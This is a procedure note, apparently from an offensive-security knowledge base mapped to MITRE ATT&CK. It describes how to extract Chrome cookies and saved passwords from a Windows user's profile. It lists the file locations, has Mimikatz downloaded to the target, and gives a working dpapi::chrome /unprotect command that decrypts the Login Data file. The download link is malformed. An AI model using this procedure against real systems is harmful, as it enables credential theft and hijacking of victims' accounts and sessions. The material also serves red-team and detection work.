---
id: 724e0bb7-42fe-4f44-a406-e7a47a67bf7f
name: Extract Chrome Cookies and Passwords From the Current User's Profile
type: procedure
verified: false
submitted: false
created_at: '2020-07-21T00:02:06.223764+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials from Web Browsers]]'
platforms:
- Windows
tags:
- '[[Chrome]]'
- '[[dump]]'
- '[[extract]]'
commands:
- '[[Mimikatz Extract Chrome Credentials from the Current User''s Session]]'
---

# Extract Chrome Cookies and Passwords From the Current User's Profile

## Summary

Attackers with code execution can extract Chrome cookies and passwords from the current user's profile. This approach only works if code execution is from the context of the target user. 

## Description

# Description

Attackers with code execution can extract Chrome cookies and passwords from the current user's profile. This approach only works if code execution is from the context of the target user.



# Instructions

1. Identify the location of cookies or passwords, which are generally stored in the following locations:

- Cookies: C:\Users\$_TARGET_USER\AppData\Local\\Google\Chrome\User Data\Default\Cookies

- Credentials: C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data

2. Download Mimikatz to the target. [Download from GitHub](http://2. Copy Mimikatz to the target: Download from GitHub [https://github.com/gentilkiwi/mimikatz])

3. Run Mimikatz, specifying the full path to the cookies or credentials file. 





**Command** ([[Mimikatz Extract Chrome Credentials from the Current User's Session]]):

```bash
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```







## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials from Web Browsers]]

## Commands Used

- [[Mimikatz Extract Chrome Credentials from the Current User's Session]]

## Tags

- [[Chrome]]
- [[dump]]
- [[extract]]


